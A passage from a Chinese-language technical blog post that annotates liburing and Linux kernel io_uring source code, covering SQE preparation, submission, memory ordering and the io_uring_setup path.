<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">IOURINGINLINE <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *_<span class="title">io_uring_get_sqe</span>(<span class="keyword">struct</span> <span class="title">io_uring</span> *<span class="title">ring</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sq</span> *<span class="title">sq</span> =</span> &amp;ring-&gt;sq;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> head, next = sq-&gt;sqe_tail + <span class="number">1</span>;</span><br><span class="line">	<span class="type">int</span> shift = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ring-&gt;flags &amp; IORING_SETUP_SQE128)</span><br><span class="line">		shift = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span> (!(ring-&gt;flags &amp; IORING_SETUP_SQPOLL))</span><br><span class="line">		head = IO_URING_READ_ONCE(*sq-&gt;khead);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		head = io_uring_smp_load_acquire(sq-&gt;khead);</span><br><span class="line">	<span class="comment">// 通过原子读获取head</span></span><br><span class="line">	<span class="comment">// sq-&gt;khead = sq-&gt;ring_ptr + p-&gt;sq_off.head;</span></span><br><span class="line">	<span class="comment">// 这里实际上读的是共享内存的一个指针内存的 uint 值</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (next - head &lt;= sq-&gt;ring_entries) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span>;</span></span><br><span class="line"></span><br><span class="line">		sqe = &amp;sq-&gt;sqes[(sq-&gt;sqe_tail &amp; sq-&gt;ring_mask) &lt;&lt; shift];</span><br><span class="line">		<span class="comment">// sq-&gt;ring_mask 来自kernel 设置的params </span></span><br><span class="line">		<span class="comment">// rings-&gt;sq_ring_mask = p-&gt;sq_entries - 1;</span></span><br><span class="line">		<span class="comment">// 由于sq_entries 为2的幂次倍</span></span><br><span class="line">		<span class="comment">// 这里实际上就是一个循环队列的访问，</span></span><br><span class="line">		sq-&gt;sqe_tail = next;</span><br><span class="line">		<span class="keyword">return</span> sqe;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="io-uring-prep-xxx"><code>io_uring_prep_xxx</code></h3>
<p>这是一个系列函数, 用来实现 <code>io_uring</code>  提供的各种 io操作, 其根本实现是 设置 一个 <code>sqe</code> 结构体(这个结构体是内核的API),</p>
<p>这里以 <code>io_uring_prep_openat</code> 为例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">IOURINGINLINE <span class="type">void</span> <span class="title function_">io_uring_prep_openat</span><span class="params">(<span class="keyword">struct</span> io_uring_sqe *sqe, <span class="type">int</span> dfd,</span></span><br><span class="line"><span class="params">					<span class="type">const</span> <span class="type">char</span> *path, <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">					<span class="type">mode_t</span> mode)</span></span><br><span class="line">&#123;</span><br><span class="line">	io_uring_prep_rw(IORING_OP_OPENAT, sqe, dfd, path, mode, <span class="number">0</span>);</span><br><span class="line">	sqe-&gt;open_flags = (__u32) flags;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">IOURINGINLINE <span class="type">void</span> <span class="title function_">io_uring_prep_rw</span><span class="params">(<span class="type">int</span> op, <span class="keyword">struct</span> io_uring_sqe *sqe, <span class="type">int</span> fd,</span></span><br><span class="line"><span class="params">				    <span class="type">const</span> <span class="type">void</span> *addr, <span class="type">unsigned</span> len,</span></span><br><span class="line"><span class="params">				    __u64 offset)</span></span><br><span class="line">&#123;</span><br><span class="line">	sqe-&gt;opcode = (__u8) op;</span><br><span class="line">	<span class="comment">// 设置op为 open</span></span><br><span class="line">	sqe-&gt;flags = <span class="number">0</span></span><br><span class="line">	sqe-&gt;ioprio = <span class="number">0</span>;</span><br><span class="line">	sqe-&gt;fd = fd;</span><br><span class="line">	<span class="comment">// 提供表示dir 的 -100 fd</span></span><br><span class="line">	sqe-&gt;off = offset;</span><br><span class="line">	<span class="comment">// 0</span></span><br><span class="line">	sqe-&gt;addr = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line">	<span class="comment">// 提供文件地址</span></span><br><span class="line">	sqe-&gt;len = len;</span><br><span class="line">	sqe-&gt;rw_flags = <span class="number">0</span>;</span><br><span class="line">	sqe-&gt;buf_index = <span class="number">0</span>;</span><br><span class="line">	sqe-&gt;personality = <span class="number">0</span>;</span><br><span class="line">	sqe-&gt;file_index = <span class="number">0</span>;</span><br><span class="line">	sqe-&gt;addr3 = <span class="number">0</span>;</span><br><span class="line">	sqe-&gt;__pad2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>归根结底就是设置了一个sqe</p>
<p>这里笔者有一个问题：<br>
#TODO<br>
在<code>IORING_SETUP_SQROLL</code>时, io_uring用户和内核采用共享内存通信，内核态是如何知道一个sqe的全部参数已经设置完毕了，有没有可能用户态正在设置sqe的部分成员时，内核已经在处理这个sqe了？</p>
<p>在之后  [[#<code>__io_uring_flush_sq</code>]] 笔者似乎找到了这个问题的答案：</p>
<ul>
<li>通过 <code>memory_store_release</code> 保证sqe的更新不会被重排到 ktail 的修改前</li>
<li>通过 修改 ktail 表示真正提交了一个任务</li>
</ul>
<h3 id="io-uring-submit"><code>io_uring_submit</code></h3>
<p><code>io_uring_submit</code> 用于提交一个任务</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">io_uring_submit</span><span class="params">(<span class="keyword">struct</span> io_uring *ring)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> __io_uring_submit_and_wait(ring, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __io_uring_submit_and_wait(<span class="keyword">struct</span> io_uring *ring, <span class="type">unsigned</span> wait_nr)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> __io_uring_submit(ring, __io_uring_flush_sq(ring), wait_nr, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最终到达 <code>__io_uring_submit</code>.  不过这个函数, 在SQPOLL模式下用处不大, 真正的提交操作应该说是在 <code>__io_uring_flush_sq</code> 中实现的.</p>
<p>这里主要是判断当前情况需不需要调用 <code>io_uring_enter</code> syscall.</p>
<p>如果当前 是IOPOLL模式, 就需要 <code>io_uring_enter</code> 来收割任务.</p>
<p>如果是 SQPOLL 模式， 且 内核处理线程已 <code>idle</code> ，那么就通过  <code>io_uring_enter</code> syscall 来唤醒</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __io_uring_submit(<span class="keyword">struct</span> io_uring *ring, <span class="type">unsigned</span> submitted,</span><br><span class="line">			     <span class="type">unsigned</span> wait_nr, <span class="type">bool</span> getevents)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">bool</span> cq_needs_enter = getevents || wait_nr || cq_ring_needs_enter(ring);</span><br><span class="line">	<span class="type">unsigned</span> flags;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	flags = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (sq_ring_needs_enter(ring, submitted, &amp;flags) || cq_needs_enter) &#123;</span><br><span class="line">		<span class="keyword">if</span> (cq_needs_enter)</span><br><span class="line">			flags |= IORING_ENTER_GETEVENTS;</span><br><span class="line">		<span class="keyword">if</span> (ring-&gt;int_flags &amp; INT_FLAG_REG_RING)</span><br><span class="line">			flags |= IORING_ENTER_REGISTERED_RING;</span><br><span class="line"></span><br><span class="line">		ret = __sys_io_uring_enter(ring-&gt;enter_ring_fd, submitted,</span><br><span class="line">					   wait_nr, flags, <span class="literal">NULL</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		ret = submitted;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="io-uring-flush-sq"><code>__io_uring_flush_sq</code></h4>
<p>主要用来更新内核sq 的tail指针， 最终返回需要提交的任务数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">unsigned</span> __io_uring_flush_sq(<span class="keyword">struct</span> io_uring *ring)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sq</span> *<span class="title">sq</span> =</span> &amp;ring-&gt;sq;</span><br><span class="line">	<span class="type">unsigned</span> tail = sq-&gt;sqe_tail;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sq-&gt;sqe_head != tail) &#123;</span><br><span class="line">		sq-&gt;sqe_head = tail;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Ensure kernel sees the SQE updates before the tail update.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (!(ring-&gt;flags &amp; IORING_SETUP_SQPOLL))</span><br><span class="line">			IO_URING_WRITE_ONCE(*sq-&gt;ktail, tail);</span><br><span class="line">			<span class="comment">// 原子读</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			io_uring_smp_store_release(sq-&gt;ktail, tail);</span><br><span class="line">			<span class="comment">// memory_release 的内存序来写</span></span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	 */</span><br><span class="line">	<span class="keyword">return</span> tail - *sq-&gt;khead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 SQPOLL 模式下,内核提交者可能同时在更新头指针。<br>
对于非 SQPOLL 模式,应用自己更新头指针,不存在并发问题。<br>
即使 SQPOLL 模式下,就算头指针读取是原子的,获取到的值也可能立即过期,存在并发修改的问题。<br>
最坏情况下,读取的值会高估实际可提交的请求数。</p>
<p>在这里用到了一个原子写 <code>IO_URING_WRITE_ONCE</code> .</p>
<p>而 <code>io_uring_smb_store_release</code> 笔者涉及到内存序的问题，内存序是为了防止指令重排产生的，笔者还没有特别理解。</p>
<p>笔者尝试解释一下， 这里使用使用<code>memory_order_release</code>内存序标注这个存储操作</p>
<p>release内存序的特点是:</p>
<ol>
<li>当前线程本地的修改对其他线程可见</li>
<li>防止存储操作被重新排序</li>
</ol>
<p>这里应该是让此处对于sqe的修改，要在对于tail指针的修改前完成，防止指令重排的影响</p>
<p>如果是对于IOPOLL，内核的真正确认提交是在 <code>io_uring_enter</code> 实现的，其实是和当前处于同一个线程，因此不需要通过  <code>memory_order_release</code> 来保证 “当前线程本地的修改对其他线程可见”， 对同一线程的数据冒险应该是由旁路机制处理的</p>
<p>#TODO</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> io_uring_smp_store_release(p, v)			\</span></span><br><span class="line"><span class="meta">	atomic_store_explicit((_Atomic __typeof__(*(p)) *)(p), (v), \</span></span><br><span class="line"><span class="meta">			      memory_order_release)</span></span><br></pre></td></tr></table></figure>
<h2 id="syscall">syscall</h2>
<p>syscall是内核提供给用户态的接口，io_uring涉及三个syscall</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/io_uring_setup.2.html">io_uring_setup(2)</a></li>
<li><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/io_uring_enter.2.html">io_uring_enter(2)</a></li>
<li><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/io_uring_register.2.html">io_uring_register(2)</a></li>
</ul>
<p>笔者这里主要讲述前两个syscall</p>
<h3 id="io-uring-setup"><code>io_uring_setup</code></h3>
<p>参数</p>
<ul>
<li>entries:  sq队列大小</li>
<li>params：提供的各种参数，许多返回值也会写入此结构体积</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">io_uring_setup</span><span class="params">(u32 entries, <span class="keyword">struct</span> io_uring_params __user *params)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> <span class="title">p</span>;</span></span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(&amp;p, params, <span class="keyword">sizeof</span>(p)))</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	<span class="comment">// 将params复制到内核空间</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ARRAY_SIZE(p.resv); i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (p.resv[i])</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (p.flags &amp; ~(IORING_SETUP_IOPOLL | IORING_SETUP_SQPOLL |</span><br><span class="line">			IORING_SETUP_SQ_AFF | IORING_SETUP_CQSIZE |</span><br><span class="line">			IORING_SETUP_CLAMP | IORING_SETUP_ATTACH_WQ |</span><br><span class="line">			IORING_SETUP_R_DISABLED | IORING_SETUP_SUBMIT_ALL |</span><br><span class="line">			IORING_SETUP_COOP_TASKRUN | IORING_SETUP_TASKRUN_FLAG |</span><br><span class="line">			IORING_SETUP_SQE128 | IORING_SETUP_CQE32 |</span><br><span class="line">			IORING_SETUP_SINGLE_ISSUER | IORING_SETUP_DEFER_TASKRUN |</span><br><span class="line">			IORING_SETUP_NO_MMAP | IORING_SETUP_REGISTERED_FD_ONLY |</span><br><span class="line">			IORING_SETUP_NO_SQARRAY))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL; </span><br><span class="line">	<span class="comment">// 如果有非法flag，直接返回</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> io_uring_create(entries, &amp;p, params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来是首先检查entries 和flags。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __cold <span class="type">int</span> <span class="title function_">io_uring_create</span><span class="params">(<span class="type">unsigned</span> entries, <span class="keyword">struct</span> io_uring_params *p,</span></span><br><span class="line"><span class="params">				  <span class="keyword">struct</span> io_uring_params __user *params)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_ring_ctx</span> *<span class="title">ctx</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_task</span> *<span class="title">tctx</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!entries)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (entries &gt; IORING_MAX_ENTRIES) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_CLAMP))</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		entries = IORING_MAX_ENTRIES;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((p-&gt;flags &amp; IORING_SETUP_REGISTERED_FD_ONLY)</span><br><span class="line">	    &amp;&amp; !(p-&gt;flags &amp; IORING_SETUP_NO_MMAP))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br></pre></td></tr></table></figure>
<p>设置sq_entries 以2的幂次向上取整， 这是为了方便环形队列的处理.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;sq_entries = roundup_pow_of_two(entries);</span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_CQSIZE) &#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If IORING_SETUP_CQSIZE is set, we do the same roundup</span></span><br><span class="line"><span class="comment">	 * to a power-of-two, if it isn&#x27;t already. We do NOT impose</span></span><br><span class="line"><span class="comment">	 * any cq vs sq ring sizing.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!p-&gt;cq_entries)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (p-&gt;cq_entries &gt; IORING_MAX_CQ_ENTRIES) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_CLAMP))</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		p-&gt;cq_entries = IORING_MAX_CQ_ENTRIES;</span><br><span class="line">	&#125;</span><br><span class="line">	p-&gt;cq_entries = roundup_pow_of_two(p-&gt;cq_entries);</span><br><span class="line">	<span class="keyword">if</span> (p-&gt;cq_entries &lt; p-&gt;sq_entries)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	p-&gt;cq_entries = <span class="number">2</span> * p-&gt;sq_entries;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来是一系列设置ctx的代码，笔者暂且不在这里分析，之后遇见了再分析每一项</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ctx = io_ring_ctx_alloc(p);</span><br><span class="line"><span class="keyword">if</span> (!ctx)</span><br><span class="line">	<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((ctx-&gt;flags &amp; IORING_SETUP_DEFER_TASKRUN) &amp;&amp;</span><br><span class="line">    !(ctx-&gt;flags &amp; IORING_SETUP_IOPOLL) &amp;&amp;</span><br><span class="line">    !(ctx-&gt;flags &amp; IORING_SETUP_SQPOLL))</span><br><span class="line">	ctx-&gt;task_complete = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;task_complete || (ctx-&gt;flags &amp; IORING_SETUP_IOPOLL))</span><br><span class="line">	ctx-&gt;lockless_cq = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * lazy poll_wq activation relies on -&gt;task_complete for synchronisation</span></span><br><span class="line"><span class="comment"> * purposes, see io_activate_pollwq()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!ctx-&gt;task_complete)</span><br><span class="line">	ctx-&gt;poll_activated = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When SETUP_IOPOLL and SETUP_SQPOLL are both enabled, user</span></span><br><span class="line"><span class="comment"> * space applications don&#x27;t need to do io completion events</span></span><br><span class="line"><span class="comment"> * polling again, they can rely on io_sq_thread to do polling</span></span><br><span class="line"><span class="comment"> * work, which can reduce cpu usage and uring_lock contention.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_IOPOLL &amp;&amp;</span><br><span class="line">    !(ctx-&gt;flags &amp; IORING_SETUP_SQPOLL))</span><br><span class="line">	ctx-&gt;syscall_iopoll = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">ctx-&gt;compat = in_compat_syscall();</span><br><span class="line"><span class="keyword">if</span> (!ns_capable_noaudit(&amp;init_user_ns, CAP_IPC_LOCK))</span><br><span class="line">	ctx-&gt;user = get_uid(current_user());</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For SQPOLL, we just need a wakeup, always. For !SQPOLL, if</span></span><br><span class="line"><span class="comment"> * COOP_TASKRUN is set, then IPIs are never needed by the app.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ret = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_SQPOLL) &#123;</span><br><span class="line">	<span class="comment">/* IPI related flags don&#x27;t make sense with SQPOLL */</span></span><br><span class="line">	<span class="keyword">if</span> (ctx-&gt;flags &amp; (IORING_SETUP_COOP_TASKRUN |</span><br><span class="line">			  IORING_SETUP_TASKRUN_FLAG |</span><br><span class="line">			  IORING_SETUP_DEFER_TASKRUN))</span><br><span class="line">		<span class="keyword">goto</span> err;</span><br><span class="line">	ctx-&gt;notify_method = TWA_SIGNAL_NO_IPI;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_COOP_TASKRUN) &#123;</span><br><span class="line">	ctx-&gt;notify_method = TWA_SIGNAL_NO_IPI;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_TASKRUN_FLAG &amp;&amp;</span><br><span class="line">	    !(ctx-&gt;flags &amp; IORING_SETUP_DEFER_TASKRUN))</span><br><span class="line">		<span class="keyword">goto</span> err;</span><br><span class="line">	ctx-&gt;notify_method = TWA_SIGNAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For DEFER_TASKRUN we require the completion task to be the same as the</span></span><br><span class="line"><span class="comment"> * submission task. This implies that there is only one submitter, so enforce</span></span><br><span class="line"><span class="comment"> * that.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_DEFER_TASKRUN &amp;&amp;</span><br><span class="line">    !(ctx-&gt;flags &amp; IORING_SETUP_SINGLE_ISSUER)) &#123;</span><br><span class="line">	<span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is just grabbed for accounting purposes. When a process exits,</span></span><br><span class="line"><span class="comment"> * the mm is exited and dropped before the files, hence we need to hang</span></span><br><span class="line"><span class="comment"> * on to this mm purely for the purposes of being able to unaccount</span></span><br><span class="line"><span class="comment"> * memory (locked/pinned vm). It&#x27;s not used for anything else.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mmgrab(current-&gt;mm);</span><br><span class="line">ctx-&gt;mm_account = current-&gt;mm;</span><br></pre></td></tr></table></figure>
<p>[[#<code>io_allocate_scq_urings</code> ]]  分配了scq和rings的内存</p>
<p>[[#<code>io_sq_offload_create</code>]]      创建了任务处理线程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ret = io_allocate_scq_urings(ctx, p);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line">	<span class="keyword">goto</span> err;</span><br><span class="line"></span><br><span class="line">ret = io_sq_offload_create(ctx, p);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line">	<span class="keyword">goto</span> err;</span><br><span class="line"></span><br><span class="line">ret = io_rsrc_init(ctx);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line">	<span class="keyword">goto</span> err;</span><br></pre></td></tr></table></figure>
